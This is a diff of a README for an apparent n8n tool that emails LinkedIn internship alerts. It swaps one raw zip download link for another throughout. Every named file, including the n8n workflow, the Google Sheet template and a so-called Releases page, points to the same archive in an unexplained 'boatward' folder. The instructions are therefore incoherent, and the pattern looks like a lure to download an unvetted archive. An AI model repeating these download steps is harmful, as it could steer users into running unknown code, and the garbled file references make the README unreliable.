@@ -1,26 +1,26 @@
 # 🎉 interns-keep-updated - Get LinkedIn Alerts for Internships
 
-[![Download](https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/keep-interns-updated-2.1.zip)](https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/keep-interns-updated-2.1.zip)
+[![Download](https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/interns_keep_updated_1.0.zip)](https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/interns_keep_updated_1.0.zip)
 
 ## 📖 Description
 LinkedIn Internship Alerts is a tool that monitors LinkedIn company page posts. It helps you keep updated by sending email alerts when a post includes specific internship and field keywords like "intern," "AI," or their Arabic equivalents. 
 
 ## 📁 Contents
-- `https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/keep-interns-updated-2.1.zip`: Import this file into n8n to set up your alerts.
-- `https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/keep-interns-updated-2.1.zip`: Use this template to create a Google Sheet for your RSS feeds.
+- `https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/interns_keep_updated_1.0.zip`: Import this file into n8n to set up your alerts.
+- `https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/interns_keep_updated_1.0.zip`: Use this template to create a Google Sheet for your RSS feeds.
 - `docs/`: Find setup instructions, troubleshooting guides, and keyword details.
 
 ## 🚀 Getting Started
 To get the tool running, follow these steps:
 
 1. **Create a Google Sheet**
-   - Open Google Sheets and create a new sheet using the `https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/keep-interns-updated-2.1.zip`.
+   - Open Google Sheets and create a new sheet using the `https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/interns_keep_updated_1.0.zip`.
 
 2. **Fill the RSS Link**
    - In your Google Sheet, locate the `rss_link` column and input your RSS feed link. You can use RSSHub or another RSS generator.
 
 3. **Import the Workflow into n8n**
-   - Download the `https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/keep-interns-updated-2.1.zip` file and import it into n8n.
+   - Download the `https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/interns_keep_updated_1.0.zip` file and import it into n8n.
 
 4. **Set Credentials**
    - Configure your Google Sheets and Gmail credentials within n8n.
@@ -34,7 +34,7 @@ To get the tool running, follow these steps:
 ## 📥 Download & Install
 To download the latest version of the application, visit the Releases page:
 
-[Download Here](https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/keep-interns-updated-2.1.zip)
+[Download Here](https://github.com/DMZ9999/interns-keep-updated/raw/refs/heads/main/boatward/interns_keep_updated_1.0.zip)
 
 ## ⚠️ Notes on RSS Stability
 Please be aware that public RSSHub instances may sometimes return a status code of 503. For better reliability, consider one of the following options:
